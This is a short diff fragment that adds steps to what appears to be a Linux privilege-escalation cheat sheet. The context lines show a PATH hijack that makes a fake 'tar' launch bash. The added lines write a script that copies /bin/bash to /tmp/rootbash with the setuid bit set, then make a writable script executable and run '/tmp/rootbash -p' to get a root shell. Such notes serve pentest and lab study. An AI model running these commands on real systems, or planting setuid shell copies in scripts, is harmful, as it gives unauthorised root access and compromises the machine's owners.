@@ -250,6 +250,20 @@ echo "/bin/bash" > tar
 chmod +x tar
 ```
 
+```
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+
+Then
+
+```
+chmod +x /home/user/overwrite.sh
+/tmp/rootbash -p
+```
+
 Modify PATH:
 
 ```bash
